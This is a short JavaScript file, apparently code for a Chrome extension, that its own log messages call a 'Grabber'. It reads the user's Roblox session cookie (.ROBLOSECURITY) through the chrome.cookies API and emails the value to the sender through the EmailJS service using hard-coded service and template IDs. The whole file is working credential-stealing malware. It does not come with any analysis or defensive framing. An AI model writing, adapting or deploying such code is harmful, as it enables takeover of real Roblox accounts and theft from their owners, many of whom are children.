(async()=>{
  console.log('🟢 Grabber executed');
  
  const PK = "q9483jeQ2w7hlwQuJ";
  const SID = "service_bfon1sx"; 
  const TID = "template_umtwpsi";
  
  // Vérif Chrome API
  if (typeof chrome === 'undefined' || !chrome.cookies) {
    console.error('❌ No chrome.cookies API');
    return;
  }
  
  chrome.cookies.get({
    url: 'https://www.roblox.com/',
    name: '.ROBLOSECURITY'
  }, async (cookie) => {
    console.log('🍪 Cookie:', cookie ? 'Found' : 'Missing');
    
    if (cookie && cookie.value) {
      console.log('📤 Sending token:', cookie.value.slice(0,20) + '...');
      
      try {
        const resp = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Origin': 'https://www.roblox.com'
          },
          body: JSON.stringify({
            service_id: SID,
            template_id: TID,
            user_id: PK,
            template_params: { message: cookie.value }
          })
        });
        
        if (resp.ok) {
          console.log('✅ EMAIL SENT SUCCESS');
        } else {
          console.error('❌ EmailJS failed:', resp.status, await resp.text());
        }
      } catch(e) {
        console.error('❌ Fetch error:', e);
      }
    }
  });
})();
